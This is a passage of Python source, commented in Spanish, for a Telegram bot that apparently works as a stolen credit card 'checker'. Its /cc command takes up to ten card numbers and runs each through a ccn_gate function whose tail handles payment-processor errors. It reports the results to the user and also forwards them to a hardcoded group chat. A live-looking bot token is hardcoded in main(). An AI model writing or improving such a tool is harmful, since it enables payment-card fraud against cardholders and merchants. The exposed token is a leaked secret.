 responsePm = json.loads(response.text)
            errores = responsePm.get('errors', [])
            mensaje_final = ' '.join(errores)
            print("Status Code:", response.status_code)
            return mensaje_final

            
                                                

          

                    
            
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

import time
from telegram.constants import ParseMode  # Asegúrate de usar esta importación

# ID del grupo al que quieres enviar los mensajes
GRUPO_CHAT_ID = 846983753

async def cc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        # Limita a un máximo de 10 tarjetas
        cards = context.args[:10]  # Toma solo las primeras 10 tarjetas si hay más

        # Mensaje inicial de procesamiento
        processing_message = await update.message.reply_text(
            "⏳ Procesando tarjetas... por favor, espera.",
            parse_mode=ParseMode.HTML
        )

        # Inicia el temporizador global
        start_time = time.time()

        results = []  # Lista para almacenar los resultados

        # Procesa cada tarjeta
        for card in cards:
            card_start_time = time.time()  # Temporizador por tarjeta
            result = ccn_gate(card)  # Procesa la tarjeta
            processing_time = time.time() - card_start_time  # Calcula tiempo de procesamiento

            # Guarda el resultado en la lista
            results.append(
                f"💳 <b>Tarjeta:</b> {card}\n"
                f"💬 <b>Resultado:</b> {result}\n"
                f"⏳ <b>Tiempo:</b> {processing_time:.2f} segundos\n"
                "───────────────"
            )

        # Calcula el tiempo total de procesamiento
        total_time = time.time() - start_time

        # Construye el mensaje final con todos los resultados
        final_message = (
            "✅ <b>Procesamiento completado</b>\n"
            + "\n".join(results)
        )

        # Edita el mensaje de "Procesando..." con el resultado final
        await processing_message.edit_text(final_message, parse_mode=ParseMode.HTML)

        # Enviar el mensaje final al grupo
        await context.bot.send_message(chat_id=GRUPO_CHAT_ID, text=final_message, parse_mode=ParseMode.HTML)

    else:
        error_message = (
            "⚠️ <b>Error:</b> Por favor, proporciona hasta 10 números de tarjeta después del comando /cc.\n"
            "Ejemplo: `/cc 1234 5678 9876 5432 1234 5678 9876 5432`"
        )
        await update.message.reply_text(error_message, parse_mode=ParseMode.HTML)
        await context.bot.send_message(chat_id=GRUPO_CHAT_ID, text=error_message, parse_mode=ParseMode.HTML)





# Configuración del bot
def main():
    # Usa 'Application' en lugar de 'Updater'
    application = Application.builder().token("5351340320:AAHobdGvFVxLLbaVHrc4frZvY2alDfd_6nM").build()

    # Añadir el manejador del comando /cc
    application.add_handler(CommandHandler("cc", cc_command))

    # Comienza el bot
    application.run_polling()

if __name__ == '__main__':
    main()